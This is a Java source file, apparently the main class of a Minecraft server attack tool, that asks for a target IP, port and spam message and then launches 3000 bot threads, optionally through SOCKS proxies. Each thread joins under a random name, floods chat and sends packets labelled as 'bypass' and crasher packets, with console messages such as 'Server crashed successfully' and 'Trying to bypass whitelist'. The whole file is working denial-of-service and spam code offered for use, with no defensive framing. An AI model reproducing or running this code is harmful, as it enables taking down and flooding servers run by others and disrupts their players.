package studio.thamessia;

import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;
import studio.thamessia.Bypass.*;
import studio.thamessia.Crashers.ClickWindowPacket;
import studio.thamessia.Crashers.Mode;
import studio.thamessia.CustomConjecture.CustomCommandManager;
import studio.thamessia.DivineC.DivineCommandManager;
import studio.thamessia.Packets.Handshake.HandshakePacket;
import studio.thamessia.Packets.Handshake.NextState;
import studio.thamessia.Packets.Login.LoginStart;
import studio.thamessia.Packets.Login.SetCompression;
import studio.thamessia.Packets.Serverbound.InteractEntity;
import studio.thamessia.Packets.Serverbound.Type;
import studio.thamessia.Packets.Status.StatusManager;
import studio.thamessia.Utils.ColorsUtils;
import studio.thamessia.Utils.DataTypes;
import studio.thamessia.Utils.GameStateOutput;
import studio.thamessia.Utils.PacketSetCompression;

import java.awt.event.KeyListener;
import java.io.*;
import java.net.*;
import java.util.*;

public class Main {
    public static InputStreamReader input = new InputStreamReader(System.in);
    public static BufferedReader bufferedReader = new BufferedReader(input);

    private static void defaultThemeAttack() throws InterruptedException, ParseException {
        try {
            ColorsUtils.setColor("cyan");
            System.out.print("\nInsert IP: ");
            ColorsUtils.setColor("red");
            String IP = bufferedReader.readLine();

            ColorsUtils.setColor("cyan");
            System.out.print("Insert port: ");
            ColorsUtils.setColor("red");
            int port = Integer.parseInt(bufferedReader.readLine());

            ColorsUtils.setColor("cyan");
            System.out.print("Insert message to spam: ");
            ColorsUtils.setColor("red");
            String message = bufferedReader.readLine();

            ColorsUtils.setColor("cyan");
            System.out.print("Use proxies? Y/n: ");
            ColorsUtils.setColor("red");
            String select = bufferedReader.readLine();

            String serverStatus = StatusManager.serverStatus(IP, (int) port);

            JSONParser jsonParser = new JSONParser();
            JSONObject jsonObject = (JSONObject) jsonParser.parse(serverStatus);

            JSONObject version = (JSONObject) jsonObject.get("version");
            long protocol = (long) version.get("protocol");

            //System.out.println(protocol);

            InetSocketAddress address = new InetSocketAddress(IP, port);

            List<Thread> bots = new ArrayList<>();

            ColorsUtils.setColor("cyan");
            System.out.println("Trying to start attack...");

            for (int j = 0; j < 3000; j++) {

                bots.add(new Thread(() -> {
                    Socket socket;
                    if (select.equalsIgnoreCase("y")) {
                        File proxiesFile = new File("proxiesFile.txt");
                        if (!proxiesFile.exists()) { System.err.println("Could not find \"proxiesFile.txt\". Exiting program..."); System.exit(0); }

                        BufferedReader fileReader = null;
                        try {
                            fileReader = new BufferedReader(new FileReader(proxiesFile));
                        } catch (FileNotFoundException e) {
                            e.printStackTrace();
                        }
                        String fileStringManager;
                        ArrayList<String> proxiesList = new ArrayList<>();

                        if (proxiesFile.length() == 0) { System.err.println("No proxy found in the file! Exiting..."); System.exit(0); }

                        try {
                            fileStringManager = fileReader.readLine();
                            proxiesList.add(fileStringManager);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        if (!proxiesList.get(0).contains(":")) { System.err.println("No valid proxy found in the file! Exiting..."); System.exit(0); }

                        String[] complexHost = proxiesList.get(0).split(":");
                        String simpleHost = complexHost[0];
                        int simplePort = Integer.parseInt(complexHost[1]);

                        //if (proxiesList.isEmpty()) System.err.println("No proxy found in the file! Exiting..."); System.exit(0);
                        //if (!proxiesList.get(0).contains(":")) System.err.println("No valid proxy found in the file! Exiting..."); System.exit(0);

                        Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(simpleHost, simplePort));

                        socket = new Socket(proxy);
                        try {
                            try {
                                socket.setTcpNoDelay(true);
                                socket.setTrafficClass(18);
                                socket.connect(address, 15000);
                            } catch (UnknownHostException e) {
                                System.err.println("[DivineError] Server is offline or doesn't exist!");
                            } catch (SocketTimeoutException e) {
                                System.err.println("[DivineError] Connection timed out, bots can't join!");
                            } catch (ConnectException e) {
                                System.err.println("[DivineError] Server has crashed or refuses connection.");
                            } catch (NullPointerException e) {
                                System.err.print("");
                            } catch (SocketException e) {
                                System.err.println("[DivineError] Proxy is having difficulty to connect, can't join!");
                            }

                            try {
                                DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                                DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                                HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
                                        IP, (short) port, NextState.LOGIN);
                                handshakePacket.sendPacket(dataOutputStream);

                                Thread.sleep(250);

                                LoginStart loginStart = new LoginStart("404_" + new Random().nextInt(5000) + "");
                                loginStart.sendPacket(dataOutputStream);

                                //checkPremium(dataInputStream, dataOutputStream, (int) protocol, IP, port);

                                //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                //clientSettingsBypass.sendPacket(dataOutputStream);

                                SetCompression setCompression = new SetCompression().readPacket(dataInputStream);

                                GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                clientSettingsBypass.sendPacket(dataOutputStream);

                                PlayerRotationBypass playerRotationBypass = new PlayerRotationBypass(15, 50, true);
                                playerRotationBypass.sendPacket(dataOutputStream);

                                ClickWindowPacket clickWindowPacket = new ClickWindowPacket((byte) 0, 0, (short) 0, (byte) 99, Mode.NORMAL_LEFT, (short) 0);
                                clickWindowPacket.sendPacket(dataOutputStream);

                                //GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                //gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);

                        /*new Thread(() -> {
                            try {
                                for (;;) interactEntity.sendPacket(dataOutputStream);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }).start();*/

                                //LoginSuccess loginSuccess = new LoginSuccess();
                                //loginSuccess.readPacket(dataInputStream);

                                Thread.sleep(200);

//                        ByteArrayOutputStream uncompressedData = new ByteArrayOutputStream();
//                        DataOutputStream udd_outputStream = new DataOutputStream(uncompressedData);
//
//                        DataTypes.writeVarInt(udd_outputStream, 0x03);
//                        DataTypes.writeString(udd_outputStream, message);
//
//                        int dLength = uncompressedData.size();
//                        byte[] compressedData = CompressionUtils.compress(uncompressedData.toByteArray(), setCompression.getThreshold());
//
//                        ByteArrayOutputStream dL = new ByteArrayOutputStream();
//                        DataOutputStream dLOutputStream = new DataOutputStream(dL);
//                        DataTypes.writeVarInt(dLOutputStream, dLength);
//
//                        int packetLength = dL.size() + compressedData.length;
//
//                        DataTypes.writeVarInt(dataOutputStream, packetLength);
//                        DataTypes.writeVarInt(dataOutputStream, dLength);
//                        dataOutputStream.write(compressedData);

                                ColorsUtils.setColor("yellow");
                                System.out.println("Sending bots...");

                                Thread.sleep(350);
                                socket.close();
                            } catch (SocketException e) {
                                System.err.print("");
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        try {
                            socket.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else socket = new Socket();
                    try {
                        try {
                            socket.setTcpNoDelay(true);
                            socket.setTrafficClass(18);
                            socket.connect(address, 15000);
                        } catch (UnknownHostException e) {
                            System.err.println("[DivineError] Server is offline or doesn't exist!");
                        } catch (SocketTimeoutException e) {
                            System.err.println("[DivineError] Connection timed out, bots can't join!");
                        } catch (ConnectException e) {
                            System.err.println("[DivineError] Server has crashed or refuses connection.");
                        } catch (NullPointerException e) {
                            System.err.print("");
                        } catch (SocketException e) {
                            System.err.println("[DivineError] Proxy is having difficulty to connect, can't join!");
                        } catch (EOFException e) {
                            System.err.println("[DivineError] Server crashed successfully.");
                        }

                        try {
                            DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                            HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
                                    IP, (short) port, NextState.LOGIN);
                            handshakePacket.sendPacket(dataOutputStream);

                            Thread.sleep(250);

                            LoginStart loginStart = new LoginStart("404_" + new Random().nextInt(5000) + "");
                            loginStart.sendPacket(dataOutputStream);

                            //checkPremium(dataInputStream, dataOutputStream, (int) protocol, IP, port);

                            //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                            //clientSettingsBypass.sendPacket(dataOutputStream);
                            try {
                                SetCompression setCompression = new SetCompression().readPacket(dataInputStream);

                                GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                clientSettingsBypass.sendPacket(dataOutputStream);

                                PlayerRotationBypass playerRotationBypass = new PlayerRotationBypass(15, 50, true);
                                playerRotationBypass.sendPacket(dataOutputStream);

                                ClickWindowPacket clickWindowPacket = new ClickWindowPacket((byte) 0, 0, (short) 0, (byte) 99, Mode.NORMAL_LEFT, (short) 0);
                                clickWindowPacket.sendPacket(dataOutputStream);

                                //GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                //gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);
                            } catch (EOFException e) {
                                System.err.println("[DivineError] Server crashed successfully.");
                            } catch (SocketException e) {
			    	            System.err.println("[DivineError] Trying to bypass whitelist...");
			                }
			   
                        /*new Thread(() -> {
                            try {
                                for (;;) interactEntity.sendPacket(dataOutputStream);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }).start();*/

                            //LoginSuccess loginSuccess = new LoginSuccess();
                            //loginSuccess.readPacket(dataInputStream);

                            Thread.sleep(200);

//                        ByteArrayOutputStream uncompressedData = new ByteArrayOutputStream();
//                        DataOutputStream udd_outputStream = new DataOutputStream(uncompressedData);
//
//                        DataTypes.writeVarInt(udd_outputStream, 0x03);
//                        DataTypes.writeString(udd_outputStream, message);
//
//                        int dLength = uncompressedData.size();
//                        byte[] compressedData = CompressionUtils.compress(uncompressedData.toByteArray(), setCompression.getThreshold());
//
//                        ByteArrayOutputStream dL = new ByteArrayOutputStream();
//                        DataOutputStream dLOutputStream = new DataOutputStream(dL);
//                        DataTypes.writeVarInt(dLOutputStream, dLength);
//
//                        int packetLength = dL.size() + compressedData.length;
//
//                        DataTypes.writeVarInt(dataOutputStream, packetLength);
//                        DataTypes.writeVarInt(dataOutputStream, dLength);
//                        dataOutputStream.write(compressedData);

                            ColorsUtils.setColor("yellow");
                            System.out.println("Sending bots...");

                            Thread.sleep(350);
                            socket.close();
                        } catch (SocketException e) {
                            System.err.print("");
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        } catch (EOFException e) {
                            System.err.println("[DivineError] Server crashed successfully.");
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    try {
                        socket.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }));
            }

            for (Thread thread : bots) {
                thread.start();
                Thread.sleep(10);
            }
        } catch (UnknownHostException e) {
            System.err.println("[DivineError] Server doesn't exist.");
        } catch (EOFException e) {
            System.err.println("[DivineError] Server is down.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void colorblindThemeAttack() throws InterruptedException, ParseException {
        try {
            ColorsUtils.setColor("yellow");
            System.out.print("\nInsert IP: ");
            ColorsUtils.setColor("cyan");
            String IP = bufferedReader.readLine();

            ColorsUtils.setColor("yellow");
            System.out.print("Insert port: ");
            ColorsUtils.setColor("cyan");
            int port = Integer.parseInt(bufferedReader.readLine());

            ColorsUtils.setColor("yellow");
            System.out.print("Insert message to spam: ");
            ColorsUtils.setColor("cyan");
            String message = bufferedReader.readLine();

            ColorsUtils.setColor("yellow");
            System.out.print("Use proxies? Y/n: ");
            ColorsUtils.setColor("cyan");
            String select = bufferedReader.readLine();

            String serverStatus = StatusManager.serverStatus(IP, (int) port);

            JSONParser jsonParser = new JSONParser();
            JSONObject jsonObject = (JSONObject) jsonParser.parse(serverStatus);

            JSONObject version = (JSONObject) jsonObject.get("version");
            long protocol = (long) version.get("protocol");

            //System.out.println(protocol);

            InetSocketAddress address = new InetSocketAddress(IP, port);

            List<Thread> bots = new ArrayList<>();

            ColorsUtils.setColor("yellow");
            System.out.println("Trying to start attack...");

            for (int j = 0; j < 3000; j++) {

                bots.add(new Thread(() -> {
                    Socket socket;
                    if (select.equalsIgnoreCase("y")) {
                        File proxiesFile = new File("proxiesFile.txt");
                        if (!proxiesFile.exists()) { System.err.println("Could not find \"proxiesFile.txt\". Exiting program..."); System.exit(0); }

                        BufferedReader fileReader = null;
                        try {
                            fileReader = new BufferedReader(new FileReader(proxiesFile));
                        } catch (FileNotFoundException e) {
                            e.printStackTrace();
                        }
                        String fileStringManager;
                        ArrayList<String> proxiesList = new ArrayList<>();

                        if (proxiesFile.length() == 0) { System.err.println("No proxy found in the file! Exiting..."); System.exit(0); }

                        try {
                            fileStringManager = fileReader.readLine();
                            proxiesList.add(fileStringManager);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        if (!proxiesList.get(0).contains(":")) { System.err.println("No valid proxy found in the file! Exiting..."); System.exit(0); }

                        String[] complexHost = proxiesList.get(0).split(":");
                        String simpleHost = complexHost[0];
                        int simplePort = Integer.parseInt(complexHost[1]);

                        //if (proxiesList.isEmpty()) System.err.println("No proxy found in the file! Exiting..."); System.exit(0);
                        //if (!proxiesList.get(0).contains(":")) System.err.println("No valid proxy found in the file! Exiting..."); System.exit(0);

                        Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(simpleHost, simplePort));

                        socket = new Socket(proxy);
                        try {
                            try {
                                socket.setTcpNoDelay(true);
                                socket.setTrafficClass(18);
                                socket.connect(address, 15000);
                            } catch (UnknownHostException e) {
                                System.err.println("[DivineError] Server is offline or doesn't exist!");
                            } catch (SocketTimeoutException e) {
                                System.err.println("[DivineError] Connection timed out, bots can't join!");
                            } catch (ConnectException e) {
                                System.err.println("[DivineError] Server has crashed or refuses connection.");
                            } catch (NullPointerException e) {
                                System.err.print("");
                            } catch (SocketException e) {
                                System.err.println("[DivineError] Proxy is having difficulty to connect, can't join!");
                            }

                            try {
                                DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                                DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                                HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
                                        IP, (short) port, NextState.LOGIN);
                                handshakePacket.sendPacket(dataOutputStream);

                                Thread.sleep(250);

                                LoginStart loginStart = new LoginStart("404_" + new Random().nextInt(5000) + "");
                                loginStart.sendPacket(dataOutputStream);

                                //checkPremium(dataInputStream, dataOutputStream, (int) protocol, IP, port);

                                //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                //clientSettingsBypass.sendPacket(dataOutputStream);

                                SetCompression setCompression = new SetCompression().readPacket(dataInputStream);

                                GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                clientSettingsBypass.sendPacket(dataOutputStream);

                                PlayerRotationBypass playerRotationBypass = new PlayerRotationBypass(15, 50, true);
                                playerRotationBypass.sendPacket(dataOutputStream);

                                ClickWindowPacket clickWindowPacket = new ClickWindowPacket((byte) 0, 0, (short) 0, (byte) 99, Mode.NORMAL_LEFT, (short) 0);
                                clickWindowPacket.sendPacket(dataOutputStream);

                                //GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                //gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);

                                Thread.sleep(200);

                                ColorsUtils.setColor("purple");
                                System.out.println("Sending bots...");

                                Thread.sleep(350);
                                socket.close();
                            } catch (SocketException e) {
                                System.err.print("");
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        try {
                            socket.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else socket = new Socket();
                    try {
                        try {
                            socket.setTcpNoDelay(true);
                            socket.setTrafficClass(18);
                            socket.connect(address, 15000);
                        } catch (UnknownHostException e) {
                            System.err.println("[DivineError] Server is offline or doesn't exist!");
                        } catch (SocketTimeoutException e) {
                            System.err.println("[DivineError] Connection timed out, bots can't join!");
                        } catch (ConnectException e) {
                            System.err.println("[DivineError] Server has crashed or refuses connection.");
                        } catch (NullPointerException e) {
                            System.err.print("");
                        } catch (SocketException e) {
                            System.err.println("[DivineError] Proxy is having difficulty to connect, can't join!");
                        } catch (EOFException e) {
                            System.err.println("[DivineError] Server crashed successfully.");
                        }

                        try {
                            DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                            HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
                                    IP, (short) port, NextState.LOGIN);
                            handshakePacket.sendPacket(dataOutputStream);

                            Thread.sleep(250);

                            LoginStart loginStart = new LoginStart("404_" + new Random().nextInt(5000) + "");
                            loginStart.sendPacket(dataOutputStream);

                            //checkPremium(dataInputStream, dataOutputStream, (int) protocol, IP, port);

                            //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                            //clientSettingsBypass.sendPacket(dataOutputStream);
                            try {
                                SetCompression setCompression = new SetCompression().readPacket(dataInputStream);

                                GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                clientSettingsBypass.sendPacket(dataOutputStream);

                                PlayerRotationBypass playerRotationBypass = new PlayerRotationBypass(15, 50, true);
                                playerRotationBypass.sendPacket(dataOutputStream);

                                ClickWindowPacket clickWindowPacket = new ClickWindowPacket((byte) 0, 0, (short) 0, (byte) 99, Mode.NORMAL_LEFT, (short) 0);
                                clickWindowPacket.sendPacket(dataOutputStream);

                                //GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                //gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);
                            } catch (EOFException e) {
                                System.err.println("[DivineError] Server crashed successfully.");
                            } catch (SocketException e) {
                                System.err.println("[DivineError] Trying to bypass whitelist...");
                            }

                        /*new Thread(() -> {
                            try {
                                for (;;) interactEntity.sendPacket(dataOutputStream);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }).start();*/

                            //LoginSuccess loginSuccess = new LoginSuccess();
                            //loginSuccess.readPacket(dataInputStream);

                            Thread.sleep(200);

//                        ByteArrayOutputStream uncompressedData = new ByteArrayOutputStream();
//                        DataOutputStream udd_outputStream = new DataOutputStream(uncompressedData);
//
//                        DataTypes.writeVarInt(udd_outputStream, 0x03);
//                        DataTypes.writeString(udd_outputStream, message);
//
//                        int dLength = uncompressedData.size();
//                        byte[] compressedData = CompressionUtils.compress(uncompressedData.toByteArray(), setCompression.getThreshold());
//
//                        ByteArrayOutputStream dL = new ByteArrayOutputStream();
//                        DataOutputStream dLOutputStream = new DataOutputStream(dL);
//                        DataTypes.writeVarInt(dLOutputStream, dLength);
//
//                        int packetLength = dL.size() + compressedData.length;
//
//                        DataTypes.writeVarInt(dataOutputStream, packetLength);
//                        DataTypes.writeVarInt(dataOutputStream, dLength);
//                        dataOutputStream.write(compressedData);

                            ColorsUtils.setColor("purple");
                            System.out.println("Sending bots...");

                            Thread.sleep(350);
                            socket.close();
                        } catch (SocketException e) {
                            System.err.print("");
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        } catch (EOFException e) {
                            System.err.println("[DivineError] Server crashed successfully.");
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    try {
                        socket.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }));
            }

            for (Thread thread : bots) {
                thread.start();
                Thread.sleep(10);
            }
        } catch (UnknownHostException e) {
            System.err.println("[DivineError] Server doesn't exist.");
        } catch (EOFException e) {
            System.err.println("[DivineError] Server is down.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void lgbtThemeAttack() throws InterruptedException, ParseException {
        try {
            lgbtThemeParseManager("\nInsert IP: ");
            ColorsUtils.setColor("purple");
            String IP = bufferedReader.readLine();

            lgbtThemeParseManager("Insert port: ");
            ColorsUtils.setColor("purple");
            int port = Integer.parseInt(bufferedReader.readLine());

            lgbtThemeParseManager("Insert message to spam: ");
            ColorsUtils.setColor("purple");
            String message = bufferedReader.readLine();

            lgbtThemeParseManager("Use proxies? Y/n: ");
            ColorsUtils.setColor("purple");
            String select = bufferedReader.readLine();

            String serverStatus = StatusManager.serverStatus(IP, (int) port);

            JSONParser jsonParser = new JSONParser();
            JSONObject jsonObject = (JSONObject) jsonParser.parse(serverStatus);

            JSONObject version = (JSONObject) jsonObject.get("version");
            long protocol = (long) version.get("protocol");

            //System.out.println(protocol);

            InetSocketAddress address = new InetSocketAddress(IP, port);

            List<Thread> bots = new ArrayList<>();

            lgbtThemeParseManager("Trying to start attack...");

            for (int j = 0; j < 3000; j++) {

                bots.add(new Thread(() -> {
                    Socket socket;
                    if (select.equalsIgnoreCase("y")) {
                        File proxiesFile = new File("proxiesFile.txt");
                        if (!proxiesFile.exists()) { lgbtThemeParseManager("Could not find \"proxiesFile.txt\". Exiting program..."); System.exit(0); }

                        BufferedReader fileReader = null;
                        try {
                            fileReader = new BufferedReader(new FileReader(proxiesFile));
                        } catch (FileNotFoundException e) {
                            e.printStackTrace();
                        }
                        String fileStringManager;
                        ArrayList<String> proxiesList = new ArrayList<>();

                        if (proxiesFile.length() == 0) { lgbtThemeParseManager("No proxy found in the file! Exiting..."); System.exit(0); }

                        try {
                            fileStringManager = fileReader.readLine();
                            proxiesList.add(fileStringManager);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        if (!proxiesList.get(0).contains(":")) { lgbtThemeParseManager("No valid proxy found in the file! Exiting..."); System.exit(0); }

                        String[] complexHost = proxiesList.get(0).split(":");
                        String simpleHost = complexHost[0];
                        int simplePort = Integer.parseInt(complexHost[1]);

                        //if (proxiesList.isEmpty()) System.err.println("No proxy found in the file! Exiting..."); System.exit(0);
                        //if (!proxiesList.get(0).contains(":")) System.err.println("No valid proxy found in the file! Exiting..."); System.exit(0);

                        Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(simpleHost, simplePort));

                        socket = new Socket(proxy);
                        try {
                            try {
                                socket.setTcpNoDelay(true);
                                socket.setTrafficClass(18);
                                socket.connect(address, 15000);
                            } catch (UnknownHostException e) {
                                lgbtThemeParseManager("[DivineError] Server is offline or doesn't exist!");
                            } catch (SocketTimeoutException e) {
                                lgbtThemeParseManager("[DivineError] Connection timed out, bots can't join!");
                            } catch (ConnectException e) {
                                lgbtThemeParseManager("[DivineError] Server has crashed or refuses connection.");
                            } catch (NullPointerException e) {
                                System.err.print("");
                            } catch (SocketException e) {
                                lgbtThemeParseManager("[DivineError] Proxy is having difficulty to connect, can't join!");
                            }

                            try {
                                DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                                DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                                HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
                                        IP, (short) port, NextState.LOGIN);
                                handshakePacket.sendPacket(dataOutputStream);

                                Thread.sleep(250);

                                LoginStart loginStart = new LoginStart("404_" + new Random().nextInt(5000) + "");
                                loginStart.sendPacket(dataOutputStream);

                                //checkPremium(dataInputStream, dataOutputStream, (int) protocol, IP, port);

                                //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                //clientSettingsBypass.sendPacket(dataOutputStream);

                                SetCompression setCompression = new SetCompression().readPacket(dataInputStream);

                                GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                clientSettingsBypass.sendPacket(dataOutputStream);

                                PlayerRotationBypass playerRotationBypass = new PlayerRotationBypass(15, 50, true);
                                playerRotationBypass.sendPacket(dataOutputStream);

                                ClickWindowPacket clickWindowPacket = new ClickWindowPacket((byte) 0, 0, (short) 0, (byte) 99, Mode.NORMAL_LEFT, (short) 0);
                                clickWindowPacket.sendPacket(dataOutputStream);

                                //GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                //gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);

                                Thread.sleep(200);
                                lgbtThemeParseManager("Sending bots...");

                                Thread.sleep(350);
                                socket.close();
                            } catch (SocketException e) {
                                System.err.print("");
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        try {
                            socket.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else socket = new Socket();
                    try {
                        try {
                            socket.setTcpNoDelay(true);
                            socket.setTrafficClass(18);
                            socket.connect(address, 15000);
                        } catch (UnknownHostException e) {
                            lgbtThemeParseManager("[DivineError] Server is offline or doesn't exist!");
                        } catch (SocketTimeoutException e) {
                            lgbtThemeParseManager("[DivineError] Connection timed out, bots can't join!");
                        } catch (ConnectException e) {
                            lgbtThemeParseManager("[DivineError] Server has crashed or refuses connection.");
                        } catch (NullPointerException e) {
                            System.err.print("");
                        } catch (SocketException e) {
                            lgbtThemeParseManager("[DivineError] Proxy is having difficulty to connect, can't join!");
                        } catch (EOFException e) {
                            lgbtThemeParseManager("[DivineError] Server crashed successfully.");
                        }

                        try {
                            DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                            HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
                                    IP, (short) port, NextState.LOGIN);
                            handshakePacket.sendPacket(dataOutputStream);

                            Thread.sleep(250);

                            LoginStart loginStart = new LoginStart("404_" + new Random().nextInt(5000) + "");
                            loginStart.sendPacket(dataOutputStream);

                            try {
                                SetCompression setCompression = new SetCompression().readPacket(dataInputStream);

                                GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                clientSettingsBypass.sendPacket(dataOutputStream);

                                PlayerRotationBypass playerRotationBypass = new PlayerRotationBypass(15, 50, true);
                                playerRotationBypass.sendPacket(dataOutputStream);

                                ClickWindowPacket clickWindowPacket = new ClickWindowPacket((byte) 0, 0, (short) 0, (byte) 99, Mode.NORMAL_LEFT, (short) 0);
                                clickWindowPacket.sendPacket(dataOutputStream);

                                //GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                //gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);
                            } catch (EOFException e) {
                                lgbtThemeParseManager("[DivineError] Server crashed successfully.");
                            } catch (SocketException e) {
                                lgbtThemeParseManager("[DivineError] Trying to bypass whitelist...");
                            }

                            Thread.sleep(200);
                            lgbtThemeParseManager("Sending bots...");

                            Thread.sleep(350);
                            socket.close();
                        } catch (SocketException e) {
                            System.err.print("");
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        } catch (EOFException e) {
                            lgbtThemeParseManager("[DivineError] Server crashed successfully.");
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    try {
                        socket.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }));
            }

            for (Thread thread : bots) {
                thread.start();
                Thread.sleep(10);
            }
        } catch (UnknownHostException e) {
            lgbtThemeParseManager("[DivineError] Server doesn't exist.");
        } catch (EOFException e) {
            lgbtThemeParseManager("[DivineError] Server is down.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void checkProxy(String fileName) throws IOException {
        String fileStringManager;

        File file = new File(fileName);
        StringBuilder stringBuilder = new StringBuilder();

        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
            for (int i = 0; (fileStringManager = bufferedReader.readLine()) != null; i++) {
                stringBuilder.append(fileStringManager);
                InetAddress address = InetAddress.getByName(fileStringManager);

                if (address.isReachable(5000)) System.out.println("PROXY: " + fileStringManager + " is working");
                else System.out.println("PROXY: " + fileStringManager + " is not working.");
            }
        } catch (FileNotFoundException e) {
            System.err.println("[DivineError] File not found.");
        }

    }

